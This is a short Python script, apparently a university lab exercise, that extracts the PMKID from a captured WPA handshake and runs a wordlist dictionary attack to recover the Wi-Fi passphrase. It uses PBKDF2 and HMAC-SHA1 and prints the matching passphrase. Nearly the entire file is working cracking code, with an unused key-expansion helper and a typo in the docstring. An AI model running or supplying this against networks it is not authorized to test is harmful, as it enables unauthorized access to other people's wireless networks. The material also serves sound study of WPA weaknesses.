#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Derive WPA keys from Passphrase and 4-way handshake infomamba

Calcule un MIC d'authentification (le MIC pour la transmission de données
utilise l'algorithme Michael. Dans ce cas-ci, l'authentification, on utilise
sha-1 pour WPA2 ou MD5 pour WPA)
"""

__author__      = "Abraham Rubinstein et Yann Lederrey"
__copyright__   = "Copyright 2017, HEIG-VD"
__license__ 	= "GPL"
__version__ 	= "1.0"
__email__ 		= "abraham.rubinstein@heig-vd.ch"
__status__ 		= "Prototype"

from scapy.all import *
from binascii import a2b_hex, b2a_hex
from pbkdf2 import pbkdf2_hex
from pbkdf2 import *
from numpy import array_split
from numpy import array
import hmac, hashlib
from tqdm.rich import tqdm

def customPRF512(key,A,B):
    """
    This function calculates the key expansion from the 256 bit PMK to the 512 bit PTK
    """
    blen = 64
    i    = 0
    R    = b''
    while i<=((blen*8+159)/160):
        hmacsha1 = hmac.new(key,A+str.encode(chr(0x00))+B+str.encode(chr(i)),hashlib.sha1)
        i+=1
        R = R+hmacsha1.digest()
    return R[:blen]

# Read capture file -- it contains beacon, authentication, associacion, handshake and data
wpa=rdpcap("PMKID_handshake.pcap")

# Check for Association Request frame and start of handshake
association_request = ""
handshake_index = -1
for i, pckt in enumerate(wpa):
    if association_request == "" and pckt.haslayer(Dot11AssoReq):
        association_request = pckt
    if handshake_index == -1 and pckt.haslayer(EAPOL):
        handshake_index = i
    if handshake_index != -1 and association_request != "":
        break

#retrieve pmkid
pmkid = wpa[handshake_index].original[-20:-4]
print("PMKID: ", pmkid)

# Important parameters for key derivation - most of them can be obtained from the pcap file
ssid = association_request.info.decode("utf-8")
APmac = a2b_hex(wpa[handshake_index].addr2.replace(":",""))
Clientmac = a2b_hex(wpa[handshake_index].addr1.replace(":",""))

print ("Reading wordlist...")
num_lines = sum(1 for line in open('wordlist.txt'))

with open('wordlist.txt') as wordlist:
    print ("Cracking passphrase...")
    for passphrase in tqdm(wordlist, total=num_lines):
            PMK = pbkdf2(hashlib.sha1, str.encode(passphrase.replace("\n", "")), ssid.encode(), 4096, 32)

            #convert to bytearray
            data = b"PMK Name" + APmac + Clientmac
            PMKID = hmac.new(PMK, data, hashlib.sha1)

            hexdigest = PMKID.hexdigest()[:-8]
            pmkidHex = pmkid.hex()

            if pmkidHex == hexdigest:
                print("FOUND PMK: ", passphrase)
                break

